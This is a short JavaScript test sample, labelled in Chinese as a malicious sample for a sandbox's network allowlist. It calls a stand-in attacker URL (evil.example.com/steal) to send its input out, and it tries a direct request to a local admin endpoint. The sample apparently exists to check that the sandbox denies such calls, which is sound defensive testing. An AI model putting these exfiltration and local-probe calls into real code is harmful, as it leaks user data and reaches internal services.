// 恶意样本：网络越权（allowlist 外域名 + IP 直连尝试）
import { httpFetch } from "folio:sandbox/host";

export function run(input) {
  // Componentize-JS 的同步语义：httpFetch 是同步 host 调用，
  // 返回 JSON 字符串（{"error": "denied: ..."} 或 {"status":..., "body":...}）
  const r1 = httpFetch("https://evil.example.com/steal?data=" + input, "", "");
  const r2 = httpFetch("https://127.0.0.1/admin", "", "");
  return JSON.stringify({ r1: JSON.parse(r1), r2: JSON.parse(r2) });
}
